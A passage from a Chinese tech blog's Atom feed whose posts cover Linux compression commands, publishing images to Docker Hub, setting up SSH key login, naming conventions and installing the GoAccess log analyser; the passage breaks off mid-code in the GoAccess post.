src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221141.png" alt=""></p><p>Mintty是一个终端仿真器 用于Cygwin的， MSYS或 Msys2 和衍生的项目，以及用于WSL。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221152.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://mingw-w64.org/doku.php/download/windows" target="_blank" rel="noopener">从Windows 运行下载Cygwin64</a></li><li><a href="https://cygwin.com/index.html" target="_blank" rel="noopener">Cygwin 是什么，不是什么？–官网</a></li><li><a href="https://www.crifan.com/files/doc/docbook/cygwin_intro/release/html/cygwin_intro.html#install_cygwin_setup_exe" target="_blank" rel="noopener">Cygwin 安装教程 详细</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在很早之前就听说过&lt;code&gt;Cygwin&lt;/code&gt;和&lt;code&gt;MinGW64&lt;/code&gt;这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和&lt;code&gt;msysGit&lt;/code&gt; 搞混淆，加上最近用&lt;code&gt;MinGW64&lt;/code&gt;用的很不顺手，所以打算安装一个&lt;code&gt;Cygwin&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="终端" scheme="https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"/>
    
    
    <category term="Cygwin" scheme="https://www.0x2beace.com/tags/Cygwin/"/>
    
    <category term="终端" scheme="https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Linux 压缩、解压、打包详解</title>
    <link href="https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/"/>
    <id>https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/</id>
    <published>2020-08-31T15:47:15.000Z</published>
    <updated>2020-08-31T15:51:20.676Z</updated>
    
    <content type="html"><![CDATA[<p>在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。</p><a id="more"></a><p>所以这篇笔记就是用来整理常见的那些解压、压缩、打包的命令。</p><p>在正式学习之前，需要明确的两个概念，打包和压缩不是一回事：</p><ul><li>打包：是指将一大堆文件或目录变成一个总的文件。</li><li>压缩：则是将一个大文件通过压缩算法变成一个小文件。</li></ul><p>为什么要区分这两个概念呢？这源于Linux 中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><h3 id="压缩-打包"><a href="#压缩-打包" class="headerlink" title="压缩/打包"></a>压缩/打包</h3><p>仅打包，不压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf foo.tar foo</span><br></pre></td></tr></table></figure><p><code>foo.tar</code>这个文件名是自定义的，只是习惯上我们使用 <code>.tar</code> 作为包文件。</p><p>打包，且压缩。<code>-z</code>参数表示以 <code>.tar.gz</code> 或者 <code>.tgz</code> 后缀名代表 gzip 压缩过的 tar 包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf foo.tar.gz foo</span><br></pre></td></tr></table></figure><p>打包，且压缩。<code>-j</code> 参数表示以 <code>.tar.bz2</code> 后缀名作为tar包名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -jcvf foo.tar.gz foo</span><br></pre></td></tr></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>在当前目录下直接解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf foo.tar.gz</span><br></pre></td></tr></table></figure><p>注意，如果这个目录下有同名的文件，不会询问，直接覆盖。</p><p>解压至指定文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf foo.tar.gz -C &lt;dir name&gt;</span><br></pre></td></tr></table></figure><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p>gzip 命令用来压缩文件。文件经它压缩过后，其名称后面会多处 <code>.gz</code> 扩展名（不带 <code>.tar</code>）。</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>将当前目录的每个文件压缩成<code>.gz</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip *</span><br></pre></td></tr></table></figure><p>递归压缩指定目录的所有文件及子目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -r &lt;dir name&gt;</span><br></pre></td></tr></table></figure><h3 id="解压-1"><a href="#解压-1" class="headerlink" title="解压"></a>解压</h3><p>解压当前目录下的<code>foo.gz</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d foo.gz</span><br></pre></td></tr></table></figure><p>解压完成之后，<code>foo.gz</code> 就变成了 <code>foo</code> 文件。</p><p>递归解压目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dr &lt;dir name&gt;</span><br></pre></td></tr></table></figure><p>解压完成之后，<code>&lt;dir name&gt;</code> 目录下的所有 <code>.gz</code> 文件都会变成正常文件。</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p><code>zip</code> 可以用来解压缩文件，或者对文件进行打包操作。文件经它压缩后会另外产生具有 <code>.zip</code> 扩展名的压缩文件。</p><h3 id="压缩-1"><a href="#压缩-1" class="headerlink" title="压缩"></a>压缩</h3><p>将当前目录下的指定目录，压缩为 <code>.zip</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r foo.zip &lt;dir name&gt;</span><br></pre></td></tr></table></figure><p>将指定目录下的所有文件及其文件夹，压缩为<code>.zip</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r foo.zip &#x2F;&lt;path to dir&gt;</span><br></pre></td></tr></table></figure><p>注意，产生的压缩文件在执行命令的那个目录下。</p><h3 id="解压-2"><a href="#解压-2" class="headerlink" title="解压"></a>解压</h3><p>unzip 命令用于解压缩由 zip 命令压缩的 <code>.zip</code>压缩包。</p><p>查看压缩包内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -v foo.zip</span><br></pre></td></tr></table></figure><p>将压缩文件在指定目录下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -n foo.zip -d &#x2F;&lt;file to dir&gt;</span><br></pre></td></tr></table></figure><p>将压缩文件在当前目下解压，如果已有相同的文件，不询问，直接覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -o foo.zip</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Linux 下的压缩解压其实并不复杂，只是不常用的情况下，很容器忘记。</p><p>如果你不知道在什么场景下，该使用什么命令，可以参照：</p><ul><li>如果只有一个大文件，可以使用 <code>gzip</code> 或者 <code>zip</code>命令。</li><li>如果是一个完整的目录，里面有很多子目录以及文件，可以使用<code>tar</code>命令。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Docker Hub 快速上手</title>
    <link href="https://www.0x2beace.com/docker-hub-quick-start/"/>
    <id>https://www.0x2beace.com/docker-hub-quick-start/</id>
    <published>2020-08-30T10:32:02.000Z</published>
    <updated>2020-08-30T10:35:11.952Z</updated>
    
    <content type="html"><![CDATA[<p>最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而<a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a> 则是托管镜像的地方。</p><a id="more"></a><p>目前大部分需求都可以直接在 Docker Hub 中下载镜像来实现，如果想使用自己仓库中的镜像，那么需要先<a href="https://hub.docker.com/" target="_blank" rel="noopener">注册</a>一个账号。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>想要从 Docker Hub 使用自己的镜像之前，首先得<a href="https://hub.docker.com/repository/create" target="_blank" rel="noopener">创建</a>一个仓库，然后将目标镜镜像 push 到该仓库。</p><p>这个仓库可以是公开的也可以是私有的，这个并不影响你正常使用。</p><p>创建成功之后，就可以看到该仓库了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200830180907.png" alt=""></p><h2 id="发布镜像"><a href="#发布镜像" class="headerlink" title="发布镜像"></a>发布镜像</h2><p>在发布之前，确保你本地存在目标镜像，可以使用 <code>docker images</code>来查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">adminer             latest              c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>创建 Tag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法</span><br><span class="line">docker tag local-image:tagname new-repo:tagname</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">docker tag adminer:latest hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>前面的 <code>tagname</code> 是本地镜像的标签名称，后面的<code>tagname</code> 是该镜像在仓库中的标签名称。</p><p>再次查看本地镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">hoooliday&#x2F;runfast   adminer             c3588b6003bb        3 weeks ago         90.4MB</span><br><span class="line">adminer             latest              c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>发布镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法</span><br><span class="line">docker push new-repo:tagname</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">docker push hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>发布成功之后，可以打开 Docker Hub 在 Repositories 的列表中就看到刚才的镜像了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200830181829.png" alt=""></p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>首先需要在命令行中登录你的 docker hub 账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker login</span><br></pre></td></tr></table></figure><p>拉取自己的镜像，这里以 <a href="https://hub.docker.com/_/adminer" target="_blank" rel="noopener">adminer</a> 这个镜像为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --link mysql:mysql --name adminer \</span><br><span class="line">-d --restart&#x3D;always \</span><br><span class="line">-p 8006:8080 \</span><br><span class="line">hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>唯一需要注意的就是最后一行，如果想要使用官方最新版本的 adminer ，那就直接写成 adminer，但如果想要使用自己的镜像，那就需要写成 <code>username/repo:tagname</code> 的格式。</p><p>查看本地所有镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">hoooliday&#x2F;runfast   adminer             c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>此持就完成了Docker 镜像的发布和拉取了，当然这只是 Docker Hub 所有功能中的冰山一角。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而&lt;a href=&quot;https://hub.docker.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Docker Hub&lt;/a&gt; 则是托管镜像的地方。&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Docker/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
    <category term="Docker Hub" scheme="https://www.0x2beace.com/tags/Docker-Hub/"/>
    
  </entry>
  
  <entry>
    <title>Linux 如何生成密钥对进行 ssh 免密登录</title>
    <link href="https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/"/>
    <id>https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/</id>
    <published>2020-08-29T03:46:41.000Z</published>
    <updated>2020-08-29T03:47:53.463Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。</p><a id="more"></a><p>这么做的目的是为了防止服务器密码被暴力破解。</p><blockquote><p>ssh 是什么？</p></blockquote><p>ssh 是一种协议，它可以基于密码进行认证，也可以基于密钥去认证用户。</p><h2 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h2><p>这里我们使用 <code>RSA</code> 类型的加密类型来创建密钥对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name</span><br></pre></td></tr></table></figure><ol><li><code>-f</code> 参数表示指定密钥对生成位置与名称</li><li>密钥对通常放在 <code>$HOME/.ssh</code> 目录下</li><li>回车即可创建密钥对，如果不需要为密钥对进行加密，那么可以一路回车。</li></ol><p>创建成功之后，可以看到 <code>.ssh</code> 目录下多了两个文件，分别是：</p><ul><li><code>your_key</code>：密钥对的私钥，通常放在客户端。</li><li><code>your_key.pub</code>：密钥对中的公钥，通常放在服务端。</li></ul><h2 id="将本地的公钥传到服务器上"><a href="#将本地的公钥传到服务器上" class="headerlink" title="将本地的公钥传到服务器上"></a>将本地的公钥传到服务器上</h2><p>注意：这里是将<code>your_key.pub</code> 公钥文件上传至你需要连接的服务器，而不是<code>your_key</code>私钥文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport</span><br></pre></td></tr></table></figure><p><code>-i</code> 参数表示使用指定的密钥，<code>-p</code>参数表示指定端口，ssh 的默认端口是 22，如果没有更改默认端口，则可以省略。</p><p>这里需要输入一次密码进行确认，如果成功之后，会看到以下内容：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200829105200.png" alt=""></p><blockquote><p>本地的公钥文件上传在服务器的哪里？</p></blockquote><p>在该用户的<code>.ssh/authorized_keys</code> 文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><h2 id="通过密钥对进行免密登录"><a href="#通过密钥对进行免密登录" class="headerlink" title="通过密钥对进行免密登录"></a>通过密钥对进行免密登录</h2><p>现在我们可以使用以下命令登录到服务器中了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip address&gt;</span><br></pre></td></tr></table></figure><p>不出意外，就可以不用输入密码而直接成功登录了。</p><p>如果你仍然需要输入密码或者遇到其他问题了，可以从以下方向进行排查。</p><h3 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h3><ol><li>如果没有使用默认的密钥名称（id_rsa），则在连接主机时需要加上<code>-i</code> 参数，指定对应密钥的名称。否则由于默认私钥与远程主机中的自定义公钥不匹配，自然无法基于密钥进行认证，会再次提示你输入密码。</li><li>服务端的<code>$HOME/.ssh</code>目录的正常权限是700，服务端<code>$HOME/.ssh/authorized_keys</code>文件的权限默认为600。</li><li>上传密钥时使用的是：公钥（.pub），进行密钥认证时使用的是：私钥。</li></ol><h3 id="配置ssh-config"><a href="#配置ssh-config" class="headerlink" title="配置ssh config"></a>配置ssh config</h3><p>上面的命令虽然可以实现免密登录，但是命令太长了，就算是复制粘贴也有可能会出错。</p><p>那有没有什么好的办法，解决这个问题呢？</p><p>当然是有的啦。</p><p>在<code>$HOME/.ssh</code> 目录下，创建一个名为<code>config</code>的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim $HOME&#x2F;.ssh&#x2F;conifg</span><br></pre></td></tr></table></figure><p>加入以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host alias</span><br><span class="line">    User user</span><br><span class="line">    HostName ip address</span><br><span class="line">    Port port</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;your_key</span><br><span class="line">    ServerAliveInterval 360</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>Host：可以理解成别名，配置完成之后，最后就通过 <code>ssh alias</code> 进行登录。</li><li>User：远程主机的用户名称</li><li>HostName：远程主机的地址</li><li>Port：端口号</li><li>IdentityFile：私钥文件的路径</li><li>ServerAliveInterval：保持客户端与服务端会话在短时间内不会断开。</li></ul><p>当然，如果你是使用<code>ssh 客户端</code>，那就不用配置这些。</p><h3 id="禁用通过密码认证"><a href="#禁用通过密码认证" class="headerlink" title="禁用通过密码认证"></a>禁用通过密码认证</h3><p>如果上面的配置都无误，可以正常通过密钥进行免密登录，那么最后需要做的一件事情就是关闭服务端的通过密码进行身份认证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># 将yes 改为 no</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>然后重启 sshd 服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><p>以上就是有关如何用自定义的密钥对进行免密认证的全部过程了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="SSH" scheme="https://www.0x2beace.com/tags/SSH/"/>
    
    <category term="SSHD" scheme="https://www.0x2beace.com/tags/SSHD/"/>
    
  </entry>
  
  <entry>
    <title>命名规范——程序员的自我修养</title>
    <link href="https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/"/>
    <id>https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/</id>
    <published>2020-08-28T13:36:57.000Z</published>
    <updated>2020-08-28T13:40:17.879Z</updated>
    
    <content type="html"><![CDATA[<p>之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。</p><a id="more"></a><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h2><p>命名规范包含了：目录、文件、变量、函数命名。<br>值得一提的是：<strong>命名规则没有谁对谁错，在项目中保持一致才是关键。</strong></p><p>混乱或错误的命名不仅让我们对代码难以理解，更糟糕的是，会误导我们的思维，导致对代码的理解完全错误。<br>相反，良好的命名，则可以让我们的代码非常容易读懂，也能向读者正确表达事物以及逻辑的本质，从而使得代码的可维护性就大大增强，读命名好的文章是非常流畅的，会有一种享受的感觉。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>因为Windows，OSX 下文件夹不区分大小写，Linux 是区分的。所以在文件夹的命名上面，建议全部用小写。可以包含下划线(<code>_</code>)或连字符(<code>-</code>)。如果没有约定，(<code>_</code>)更好。</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p>文件的命名也是推荐和目录的连字符保持一致。Linux 文件系统推荐的文件命名是下划线(<code>_</code>)。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类型名称通常使用大写驼峰命名法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyClass</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="类成员"><a href="#类成员" class="headerlink" title="类成员"></a>类成员</h4><p>不管是静态还是非静态，类数据成员的命名都可以和普通变量一样，采用驼峰命名法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123;</span><br><span class="line">    public $myVariable;</span><br><span class="line">    public static $myStaticVariable;</span><br><span class="line">    </span><br><span class="line">    public function myFunction($firstWord, $secondWord)&#123;</span><br><span class="line">        &#x2F;&#x2F;方法中的参数名推荐使用小驼峰命名法</span><br><span class="line">        ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一般名称的前缀都是有第一规律的，如is（判断）、get（得到），set（设置）。</p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量的命名有两种方式：</p><ul><li>下划线命名法：my_variable</li><li>小驼峰命名法：myVariable</li></ul><p>但通常还是推荐使用，下划线命名法（全是小写）。</p><blockquote><p>不同的语言也是有不同的规范，例如JavaScript 变量推荐驼峰命名法，CSS 推荐连字符(-)。</p></blockquote><h3 id="常量、全局常量"><a href="#常量、全局常量" class="headerlink" title="常量、全局常量"></a>常量、全局常量</h3><p>常量和全局常量通常使用全大写和下划线的方式来命名，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const MY_CONSTANT;</span><br><span class="line">define(&quot;DEFAULT_NUM&quot;, 10);</span><br></pre></td></tr></table></figure><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;引用变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;全局变量</span><br></pre></td></tr></table></figure><h3 id="函数命名"><a href="#函数命名" class="headerlink" title="函数命名"></a>函数命名</h3><p>函数的命名使用下划线命名法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function my_function()&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h4><p>函数和方法的区别：<br>函数是一段可以重用的代码块，方法是在类里面的函数。</p><p>参考链接：</p><ul><li><a href="https://www.cnblogs.com/rainman/p/3756521.html" target="_blank" rel="noopener">PHP 命名规范</a></li><li><a href="https://www.zhihu.com/question/21440067" target="_blank" rel="noopener">如何优雅的为变量和函数命名</a></li><li><a href="https://zh-google-styleguide.readthedocs.io/en/latest/" target="_blank" rel="noopener">命名约定 | Google开源项目风格指南</a></li><li><a href="https://leohxj.gitbooks.io/a-programmer-prepares/programmer-basic/naming.html" target="_blank" rel="noopener">命名规范 | 程序员的自我修养</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。&lt;/p&gt;</summary>
    
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>日志分析工具 - GoAccess</title>
    <link href="https://www.0x2beace.com/log-analysis-tool-goaccess/"/>
    <id>https://www.0x2beace.com/log-analysis-tool-goaccess/</id>
    <published>2020-08-27T14:59:41.000Z</published>
    <updated>2020-08-27T15:02:37.808Z</updated>
    
    <content type="html"><![CDATA[<p>在最近发生那件事情之前，<strong>日志</strong>很少能引起我的重视，导致往往出现什么问题，第一时间并不是去看日志。</p><a id="more"></a><p>很显然我完全忽视了它的强大性，就拿 nginx 的访问日志来说，可以从中分析出如下信息：</p><ol><li>请求的响应时间</li><li>请求达到的后端服务器的地址和端口</li><li>请求是否存在缓存配置</li><li>请求体、请求头、响应体和响应头的大小等</li><li>客户端的IP 地址、UserAgent 等信息</li><li>自定义变量的内容</li></ol><p>通过这些信息，可以得到响应耗时的请求以及请求量和并发量，从而分析并发原因，这对于应用级别的服务来说是非常重要的。</p><h2 id="GoAccess-是什么"><a href="#GoAccess-是什么" class="headerlink" title="GoAccess 是什么"></a>GoAccess 是什么</h2><p>GoAccess 是一个开源的<strong>实时网络日志分析器</strong>和<strong>交互式查看器</strong>，可以在类 Unix 系统中的终端或通过浏览器运行。 —— GoAccess 官方</p><blockquote><p>为什么选择 GoAccess？</p></blockquote><ol><li><p>因为GoAccess 被设计成一个基于终端的快速日志分析器。它的核心思想是实时快速分析和查看Web服务器统计信息，而无需使用浏览器。同时也可以将输入到HTML 或者 CSV、JSON。</p></li><li><p>GoAccess几乎可以解析任何Web日志格式（Apache，Nginx，Amazon S3，Elastic Load Balancing，CloudFront等）。只需要设置日志格式并根据您的日志运行它。</p></li></ol><h2 id="GoAccess-入门"><a href="#GoAccess-入门" class="headerlink" title="GoAccess 入门"></a>GoAccess 入门</h2><p>昨天在使用 GoAccess 时，踩到了一些坑，导致我一度认为这个工具是不是存在什么Bug。因为在看别人的教程中都是开箱即用。</p><p>下面从安装到使用会一一详细说明。</p><h3 id="安装-GoAccess"><a href="#安装-GoAccess" class="headerlink" title="安装 GoAccess"></a>安装 GoAccess</h3><p>因为服务器的操作系统是 <code>Ubuntu</code>，所以这里以 <code>Ubuntu</code>为例：</p><p> 因为并非所有发行版都提供最新版本的 GoAccess，所以这里使用官方提供的最新稳定版的安装方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $（lsb_release -cs）main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list</span><br><span class="line">$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - </span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install goaccess</span><br></pre></td></tr></table></figure><h3 id="确定日志格式"><a href="#确定日志格式" class="headerlink" title="确定日志格式"></a>确定日志格式</h3><p>在计算机安装了GoAccess 之后，要做的第一件事情就是确定访问日志的日志格式，可以在永久设置它们，也可以通过命令行传递他们。</p><p>这里用Nginx 的 access.log 为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 